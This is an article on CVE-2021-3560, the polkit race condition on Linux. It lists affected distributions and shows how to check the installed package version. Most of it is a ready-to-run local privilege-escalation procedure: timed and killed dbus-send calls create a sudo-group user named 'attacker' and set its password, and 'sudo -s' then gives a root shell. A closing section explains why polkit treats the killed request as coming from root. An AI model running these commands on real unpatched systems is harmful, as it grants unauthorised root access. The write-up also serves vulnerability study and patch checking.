
CVE-2021-3560 has emerged as a significant concern for Linux-based systems. This security flaw (via Race Condition), also known as the "Polkit" vulnerability, allows local attackers to gain root privileges, potentially leading to complete compromise of the affected system. In this article, we will delve into the details of CVE-2021-3560, its impact, and recommended measures to mitigate the risk, the exploit is fully explained here: https://kaarb0.medium.com/exploitation-of-cve-2021-3560-cecfdf250397.

# Useful Information:

Specifically, the following mainstream distributions, amongst others, were vulnerable:

- Red Hat Enterprise Linux 8
- Fedora 21 (or later)
- Debian Testing ("Bullseye")
- Ubuntu 20.04 LTS ("Focal Fossa")

Canonical released a patch for their version of polkit (`policykit-1`), which has version number `0.105-26ubuntu1.1`. The last vulnerable version available in the apt repositories for Focal Fossa is `0.105-26ubuntu1`.

We can use `apt list --installed | grep policykit-1` to check the installed version of polkit.
# Exploitation

First, we need to determine how long our command will take to run. Let's try this with the first dbus message, so we know when to kill the command (try to kill the command approximately halfway through execution):

```bash
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```

Suppose it took 10 or 11 ms so we need to kill it after 0.005s (we might try this several times to work), we send the following dbus message to add a new account named "Attacker" with sudo permissions, with a description of "Pentester Account" and membership of the sudo group set to true (referenced by the `int32:1` flag):

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

Now, Using openssl, we generate a password of type 6 (SHA512-crypt) and our plaintext password (`test123`).

```bash
openssl passwd -6 test123
```

Then, we send another dbus message to set the password by changing the hash below for the new account with a hint "Ask the pentester", note that we must check the id number of the user we added using `id <username>`, suppose it is `1000` then we add 1000 like below: 

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$t4zNXiNz7BtiSp9a$PcyHUTHMhjLn5T8mp5HqqfrUTthjLRR3hHht8yU9BOEwXWen7Yhf0uV4RdGTwghnqXWSANvX2gj.74GSDUmGn0' string:'Ask the pentester' & sleep 0.005s; kill $!
```

Finally, run this command to get a root shell `sudo -s`.

# How is Polkit Vulnerable ?

By manually sending dbus messages to the dbus-daemon (effectively an API to allow different processes the ability to communicate with each  
other), then killing the request before it has been fully processed, we can trick polkit into authorising the command. If you are not familiar with daemons, they are effectively background services running on Linux. The dbus-daemon is a program running in the background which brokers messages between applications.

The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.  
The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID. Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.  
The dbus-daemon can’t find the message ID because we killed it in step two. It handles the error by responding with an error code.  
Polkit mishandles the error and substitutes in 0 for the user ID — i.e. the root account of the machine.  
Thinking that the root user requested the action, polkit allows the request to go through unchallenged.  
In short, by destroying the message ID before the dbus-daemon has a chance to give polkit the correct ID, we exploit the poor error-handling in polkit to trick the utility  
into thinking that the request was made by the all-powerful root user.
